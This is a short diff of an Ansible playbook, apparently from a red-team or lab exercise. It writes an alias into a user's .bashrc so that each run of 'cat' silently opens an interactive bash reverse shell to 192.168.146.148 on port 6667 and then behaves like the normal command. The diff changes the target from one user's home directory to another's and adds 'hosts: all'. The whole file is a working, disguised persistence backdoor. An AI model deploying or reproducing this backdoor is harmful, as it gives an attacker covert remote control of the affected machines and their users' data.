@@ -1,9 +1,10 @@
 ---
 - name: "made an alias for cat to open reverse shell"
+  hosts: all
   become: yes
   tasks:
     - name: "make alias for cat"
       lineinfile:
-        path: /home/bri/.bashrc
+        path: /home/alice/.bashrc
         line: "alias cat='f(){ (script -c \"bash -i\" /dev/null </dev/tcp/192.168.146.148/6667 >&0 2>&1 &); cat \"$@\"; unset -f f; }; f'"
 
